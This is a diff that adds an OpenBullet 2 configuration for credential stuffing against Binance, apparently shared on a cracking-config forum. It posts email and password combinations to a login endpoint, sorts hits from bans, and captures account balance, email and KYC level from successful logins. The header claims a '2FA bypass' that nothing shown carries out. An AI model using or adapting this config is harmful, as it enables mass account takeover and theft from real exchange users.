@@ -1,0 +1,33 @@
+# OpenBullet 2 config — Binance OB + 2FA bypass
+# Target: Binance   Tool: OpenBullet 2
+# Uploader: user #8
+# CPM: 400   Capture rate: 0.05
+# ============================================================
+
+BLOCK:HttpRequest
+  url = "https://api.binance.com/v1/auth/login"
+  method = POST
+  headers {
+    "User-Agent" = "<UA>"
+    "Content-Type" = "application/json"
+    "Accept" = "application/json"
+  }
+  body {
+    "{\"email\":\"<INPUT>\",\"password\":\"<PASS>\"}"
+  }
+ENDBLOCK
+
+BLOCK:Keycheck
+  banOn = "429"
+  banOn = "captcha"
+  successOn = "\"token\":\""
+  failureOn = "\"error\""
+ENDBLOCK
+
+BLOCK:Parse
+  "\"balance\":\"(.*?)\"" -> CAPTURE "Balance"
+  "\"email\":\"(.*?)\"" -> CAPTURE "Email"
+  "\"kyc_level\":\"(.*?)\"" -> CAPTURE "KYC_level"
+ENDBLOCK
+
+# config-id: 722683
